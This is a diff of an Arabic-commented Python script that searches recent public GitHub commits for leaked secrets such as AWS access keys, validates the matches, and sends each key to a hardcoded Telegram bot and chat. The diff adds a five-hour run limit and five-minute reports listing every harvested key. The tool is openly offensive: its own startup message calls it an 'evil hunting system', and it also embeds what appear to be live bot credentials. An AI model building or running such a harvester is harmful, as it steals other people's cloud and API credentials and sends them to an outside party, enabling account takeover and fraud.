@@ -13,6 +13,9 @@ TELEGRAM_TOKEN = "8914882875:AAGmoUu_Ckl16HA0wrcM6YICNz1ZH_WphCQ"
 TELEGRAM_CHAT_ID = "6306556778"
 # =================================================================
 
+# مدة التشغيل الكلية (5 ساعات)
+TOTAL_RUN_DURATION = 5 * 60 * 60  # 18000 ثانية
+
 # أنماط البحث
 PATTERNS = {
     'aws': r'(AKIA|ASIA)[A-Z0-9]{16}',
@@ -69,7 +72,7 @@ def search_github(query, token):
         'Authorization': f'token {token}',
         'Accept': 'application/vnd.github.v3+json'
     }
-    time_filter = (datetime.utcnow() - timedelta(hours=1)).isoformat() + 'Z'
+    time_filter = (datetime.utcnow() - timedelta(hours=6)).isoformat() + 'Z'
     url = f"https://api.github.com/search/code?q={query}+pushed:>{time_filter}&per_page=30"
     try:
         resp = requests.get(url, headers=headers, timeout=20)
@@ -96,28 +99,68 @@ def send_to_telegram(bot_token, chat_id, text, parse_mode='Markdown'):
         print(f"Telegram Error: {e}")
         return False
 
-def send_key(bot_token, chat_id, key_type, key_value, raw_url):
+def send_key(bot_token, chat_id, key_type, key_value, raw_url, is_valid, detection_time):
+    """إرسال المفتاح فوراً عند اكتشافه"""
+    status = "✅ صالح" if is_valid else "❌ غير صالح"
     msg = (
-        f"🔑 *{key_type.upper()}*\n"
+        f"{status} *{key_type.upper()}*\n"
         f"`{key_value}`\n"
         f"📁 {raw_url}\n"
-        f"🕒 {datetime.utcnow().strftime('%Y-%m-%d %H:%M:%S UTC')}"
+        f"🕒 الاكتشاف: {detection_time}"
     )
     send_to_telegram(bot_token, chat_id, msg)
 
-def send_heartbeat(bot_token, chat_id, count):
+def send_periodic_report(bot_token, chat_id, valid_list, invalid_list, elapsed_min, total_min):
+    """إرسال تقرير دوري كل 5 دقائق يحتوي على قوائم المفاتيح المكتشفة في آخر فترة"""
+    valid_count = len(valid_list)
+    invalid_count = len(invalid_list)
+    
+    report = (
+        f"📊 *تقرير دوري (كل 5 دقائق)*\n"
+        f"⏳ الوقت المنقضي: {elapsed_min} / {total_min} دقيقة\n"
+        f"✅ المفاتيح الصالحة الجديدة: {valid_count}\n"
+        f"❌ المفاتيح غير الصالحة الجديدة: {invalid_count}\n"
+        f"📅 {datetime.utcnow().strftime('%Y-%m-%d %H:%M:%S')} UTC\n\n"
+    )
+    
+    if valid_list:
+        report += "*✅ المفاتيح الصالحة (الخمس دقائق الأخيرة):*\n"
+        for k in valid_list:
+            report += f"🔑 {k['type']}: `{k['key']}` (وقت: {k['time']})\n"
+    else:
+        report += "لا توجد مفاتيح صالحة جديدة.\n"
+    
+    if invalid_list:
+        report += "\n*❌ المفاتيح غير الصالحة (الخمس دقائق الأخيرة):*\n"
+        for k in invalid_list:
+            report += f"🔒 {k['type']}: `{k['key']}` (وقت: {k['time']})\n"
+    else:
+        report += "لا توجد مفاتيح غير صالحة جديدة."
+    
+    send_to_telegram(bot_token, chat_id, report)
+
+def send_startup_msg(bot_token, chat_id):
     msg = (
-        f"💓 *النظام يعمل ويبحث* 💓\n"
-        f"⏳ الوقت: {datetime.utcnow().strftime('%Y-%m-%d %H:%M:%S')} UTC\n"
-        f"🔄 عدد دورات الصيد المنفذة: {count}\n"
-        f"👁️ مراقبة نشطة ... أنتظر أوامرك."
+        f"🔥 *بدء نظام الصيد لمدة 5 ساعات* 🔥\n"
+        f"✅ سيتم إرسال كل مفتاح فوراً.\n"
+        f"✅ سيتم إرسال تقرير مفصل كل 5 دقائق.\n"
+        f"🕒 {datetime.utcnow().strftime('%Y-%m-%d %H:%M:%S')} UTC"
     )
     send_to_telegram(bot_token, chat_id, msg)
 
-# ------------------- دورة البحث الرئيسية -------------------
-def search_cycle(token, bot_token, chat_id):
-    """تنفذ دورة بحث واحدة عن جميع الأنماط وترسل النتائج"""
-    found_any = False
+def send_shutdown_msg(bot_token, chat_id, total_valid, total_invalid):
+    msg = (
+        f"🛑 *تم إيقاف النظام بعد 5 ساعات* 🛑\n"
+        f"📊 الإحصائيات النهائية:\n"
+        f"✅ إجمالي المفاتيح الصالحة: {total_valid}\n"
+        f"❌ إجمالي المفاتيح غير الصالحة: {total_invalid}\n"
+        f"📅 {datetime.utcnow().strftime('%Y-%m-%d %H:%M:%S')} UTC"
+    )
+    send_to_telegram(bot_token, chat_id, msg)
+
+# ------------------- دورة البحث -------------------
+def search_cycle(token, bot_token, chat_id, global_valid, global_invalid, recent_valid, recent_invalid):
+    """تنفذ دورة بحث واحدة، وترسل كل مفتاح فوراً، وتضيفه إلى القوائم"""
     for name, pattern in PATTERNS.items():
         results = search_github(f'"{pattern}"', token)
         print(f"[*] فحص {name}: {len(results)} ملف")
@@ -130,20 +173,30 @@ def search_cycle(token, bot_token, chat_id):
                 if resp.status_code != 200:
                     continue
                 matches = re.findall(pattern, resp.text)
+                detection_time = datetime.utcnow().strftime('%Y-%m-%d %H:%M:%S UTC')
                 for m in set(matches):
                     valid = True
                     if name in VALIDATORS:
                         valid = VALIDATORS[name](m)
+                    
+                    key_info = {'type': name, 'key': m, 'time': detection_time, 'url': raw_url}
+                    
+                    # التخزين في القوائم العامة والمؤقتة
                     if valid:
-                        send_key(bot_token, chat_id, name, m, raw_url)
-                        found_any = True
+                        global_valid.append(key_info)
+                        recent_valid.append(key_info)
+                    else:
+                        global_invalid.append(key_info)
+                        recent_invalid.append(key_info)
+                    
+                    # إرسال فوري (شرط أساسي)
+                    send_key(bot_token, chat_id, name, m, raw_url, valid, detection_time)
                     time.sleep(random.uniform(1.0, 2.5))
             except Exception as e:
                 print(f"[-] خطأ: {e}")
             time.sleep(random.uniform(0.3, 0.8))
-    return found_any
 
-# ------------------- التشغيل الدائم (الحلقة اللانهائية) -------------------
+# ------------------- التشغيل الرئيسي -------------------
 def main():
     token = PAT_TOKEN
     bot_token = TELEGRAM_TOKEN
@@ -153,48 +206,61 @@ def main():
         print("ERROR: تأكد من التوكنات")
         sys.exit(1)
 
-    # رسالة بدء التشغيل (مرة واحدة فقط)
-    start_msg = (
-        f"🔥 *تم تشغيل نظام الصيد الشرير* 🔥\n"
-        f"✅ سأرسل لك نبضات قلب كل 5 دقائق.\n"
-        f"✅ سأرسل أي مفتاح صالح فور العثور عليه.\n"
-        f"🕒 {datetime.utcnow().strftime('%Y-%m-%d %H:%M:%S')} UTC"
-    )
-    send_to_telegram(bot_token, chat_id, start_msg)
-    print("[+] تم إرسال رسالة بدء التشغيل.")
+    start_time = time.time()
+    end_time = start_time + TOTAL_RUN_DURATION
+
+    # قوائم عامة (كل المفاتيح منذ البداية)
+    global_valid = []
+    global_invalid = []
+    
+    # قوائم مؤقتة (لآخر 5 دقائق فقط)
+    recent_valid = []
+    recent_invalid = []
+
+    # رسالة البدء
+    send_startup_msg(bot_token, chat_id)
+    print("[+] تم إرسال رسالة البدء.")
 
     cycle_count = 0
-    last_heartbeat = time.time()
+    last_report_time = time.time()
 
-    # الحلقة اللانهائية (ستعمل حتى توقفها GitHub بعد 6 ساعات)
-    while True:
+    # الحلقة الرئيسية
+    while time.time() < end_time:
         try:
-            # 1. تنفيذ دورة البحث
+            # 1. تنفيذ دورة بحث
             print(f"[*] بدء الدورة رقم {cycle_count + 1}")
-            search_cycle(token, bot_token, chat_id)
+            search_cycle(token, bot_token, chat_id, global_valid, global_invalid, recent_valid, recent_invalid)
             cycle_count += 1
 
-            # 2. انتظر 5 دقائق قبل الدورة التالية
-            print("[*] انتظار 5 دقائق قبل الدورة التالية...")
+            # 2. انتظار 5 دقائق قبل الدورة التالية (مع مراقبة وقت التقرير)
             wait_time = 300  # 5 دقائق
-
-            # نرسل نبضات قلب كل 5 دقائق أثناء الانتظار
-            start_wait = time.time()
-            while time.time() - start_wait < wait_time:
-                time.sleep(10)  # نتحقق كل 10 ثوانٍ
-                if time.time() - last_heartbeat >= 300:  # مرت 5 دقائق
-                    send_heartbeat(bot_token, chat_id, cycle_count)
-                    last_heartbeat = time.time()
-
-            # نبض إضافي بعد انتهاء الانتظار مباشرة
-            send_heartbeat(bot_token, chat_id, cycle_count)
-            last_heartbeat = time.time()
+            wait_start = time.time()
+            while time.time() - wait_start < wait_time and time.time() < end_time:
+                time.sleep(5)  # نتحقق كل 5 ثوانٍ
+                
+                # كل 5 دقائق من آخر تقرير، نرسل التقرير الدوري
+                if time.time() - last_report_time >= 300:
+                    elapsed_min = int((time.time() - start_time) / 60)
+                    total_min = int(TOTAL_RUN_DURATION / 60)
+                    
+                    # نرسل التقرير عن آخر 5 دقائق
+                    send_periodic_report(bot_token, chat_id, recent_valid, recent_invalid, elapsed_min, total_min)
+                    
+                    # نمسح القوائم المؤقتة بعد إرسال التقرير
+                    recent_valid.clear()
+                    recent_invalid.clear()
+                    
+                    last_report_time = time.time()
 
         except Exception as e:
-            # لو حصل خطأ غير متوقع، نرسل رسالة خطأ ونستمر
             error_msg = f"⚠️ *خطأ غير متوقع*: {str(e)[:100]}\nسيتم إعادة المحاولة..."
             send_to_telegram(bot_token, chat_id, error_msg)
             time.sleep(60)
+
+    # ------------------- رسالة الإغلاق (بدون تقرير ختامي مفصل) -------------------
+    print("[+] انتهت المدة المحددة (5 ساعات). إرسال رسالة الإغلاق...")
+    send_shutdown_msg(bot_token, chat_id, len(global_valid), len(global_invalid))
+    print("[+] تم الإنهاء.")
 
 if __name__ == "__main__":
     main()
